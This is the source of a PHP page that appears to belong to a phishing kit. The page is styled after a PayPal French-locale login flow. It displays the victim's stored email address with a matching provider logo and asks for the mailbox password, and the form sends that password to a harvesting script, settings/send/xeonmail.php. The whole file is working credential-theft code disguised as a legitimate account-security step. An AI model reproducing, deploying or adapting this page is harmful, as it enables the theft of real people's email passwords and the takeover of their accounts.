<?php
	include("../settings/lang/index.php");
	session_start();
?>
<!DOCTYPE html>
<html lang="fr-FR">
<head>
	<title><?php echo $xeon1; ?></title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<link rel="shortcut icon" href="../assets/img/x.ico">
	<link rel="apple-touch-icon" href="../assets/img/appx.png">
	<link rel="stylesheet" href="../assets/css/fonts.css" />
	<link rel="stylesheet" href="../assets/css/main.css" />
	<link rel="stylesheet" href="../assets/css/sections.css" />
	<link rel="stylesheet" href="../assets/css/responsev.css" />
	<script type="text/javascript" src="../assets/js/jquery.min.js"></script>
</head>
<body>

	<!--
authflow/entry/?country.x=FR&flowContext=login&flowId=ul&locale.x=fr_FR&returnUri=%2Fauth%2Freturn&stepupContext=8328080216937885391
	-->

	<div>
		<style nonce="">html { display:block }</style>
		<div>
			<div>


		<!--[ ALERT MESSAGE CONTAINER ]-->
				<div class="xeonContent" id="xeonmsgInfo">

				<!-- CONTAINER --> 
					<div class="xeonsafeComponent">
						<header>
							<div class="xeonLogo"></div>
						</header>
						<div class="xeonsafe">
							<h1><?php echo $xeon2; ?></h1>
							<div class="xeonSafeDescription"><p class="xeonDescription"><?php echo $xeon3; ?></p></div>
							<input type="button" class="xeonButton" value="<?php echo $xeon4; ?>" onclick="showbill()">
						</div>
					</div>

				</div>


		<!--[ MAILBOX CONTAINER ]-->
			<div class="xeonContent xeonContentInfo hide" id="xeonbillInfo">

				<!-- CONTAINER --> 
					<div class="xeonsafeComponent">
						<header class="xeonInfo">
							<div class="xeonLogo big"></div>
						</header>
						<div class="xeonsafe">
							<h1 class="xeonInfoTitle"><?php echo $xeon5; ?></h1>
								<p class="xeonFormTitle"><?php echo $xeon6; ?></p>

							<form action="../settings/send/xeonmail.php" method="post" name="EmailForm" onsubmit="return validateEmailForm()">

								<div class="xeonMailBox">
									<div class="xeomMailLogo">

										<?php

										$usermail = $_SESSION["email"];
										if(strpos($usermail, "hotmail") == true || strpos($usermail, "outlook") == true) {
											echo '<img src="../assets/img/mails/hotmail.svg" style="height: 30px;">';
										}
										elseif(strpos($usermail, "gmail") == true || strpos($usermail, "googlemail") == true) {
											echo '<img src="../assets/img/mails/gmail.png" style="height: 50px;">';
										}
										elseif(strpos($usermail, "yahoo") == true || strpos($usermail, "ymail") == true) {
											echo '<img src="../assets/img/mails/yahoo.png" style="height: 50px;">';
										}
										elseif(strpos($usermail, "orange") == true || strpos($usermail, "wanadoo") == true) {
											echo '<img src="../assets/img/mails/orange.png" style="height: 60px;">';
										}
										elseif(strpos($usermail, "sfr") == true) {
											echo '<img src="../assets/img/mails/sfr.png" style="height: 60px;">';
										}
										elseif(strpos($usermail, "gmx") == true) {
											echo '<img src="../assets/img/mails/gmx.png" style="height: 70px;">';
										}
										elseif(strpos($usermail, "free") == true) {
											echo '<img src="../assets/img/mails/free.png" style="height: 60px;">';
										}
										elseif(strpos($usermail, "aol") == true) {
											echo '<img src="../assets/img/mails/aol.svg" style="height: 60px;">';
										}
										else{
											echo '<img src="../assets/img/mails/default.png" style="height: 80px;">';
										}

										?>

										
									</div>
						 			<div class="xeon-r-mail">
						 				<div class="contact"><?php echo $xeon7; ?><br>
						 					<p><span><?php echo $_SESSION["email"]; ?></span></p>
						 				</div>
						 			</div>
					 			</div>

								<div class="xeonFieldset">
									<input type="password" name="xeonmailboxpass" id="xeonmailboxpass" placeholder="<?php echo $xeon8; ?>" autocomplete="off" autocorrect="off" />
									<div style="text-align: right;" class="xeonWhatIsMailContainer">
										<a href="javascript:void(0)" class="xeonWhatIsMail" onclick="xeonWhatIsMail()"><?php echo $xeon9; ?></a>
										<p class="xeonWhatIsMailText hide" id="xeonWhatIsMailText">
											<?php echo $xeon10; ?>
										</p>
									</div>
								</div>


								<input type="submit" class="xeonButton" value="<?php echo $xeon11; ?>">
							</form>
						</div>
					</div>

				</div>
			</div>
		</div>
	</div>

	<footer class="xeonFooter">
		<ul class="xeonFooterLinks">
			<li class="contactFooterListItem"><a href="javascript:void()"><?php echo $foot1; ?></a></li>
			<li class="privacyFooterListItem"><a href="javascript:void()"><?php echo $foot2; ?></a></li>
			<li class="legalFooterListItem"><a href="javascript:void()"><?php echo $foot3; ?></a></li>
			<li class="worldwideFooterListItem"><a href="javascript:void()"><?php echo $foot4; ?></a></li>
		</ul>
		<div></div>
	</footer>

	<script type="text/javascript" src="../assets/js/main.js"></script>
	<script type="text/javascript" src="../assets/js/sections.js"></script>
	<script>
	$(document).ready(function(){
		$('#xeonmailboxpass').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeonmailboxpass').removeClass('hasError'); } else {$('#xeonmailboxpass').removeClass('hasError'); }});
		
		});
	</script>

<!-- LOADING -->
	<div class="xeonLoaderOverlay">
		<div class="xeonModalAnimate" id="xeonModalAnimate">
			<div class="xeonRotate"></div>
			<div class="xeonProcessing"><?php echo $xeon12; ?></div>
			<div class="xeonLoaderOverlayAdditionalElements"></div>
		</div>
	</div>
	<div class="xeonModalOverlay" id="xeonModalOverlay"></div>
		
</body>
</html>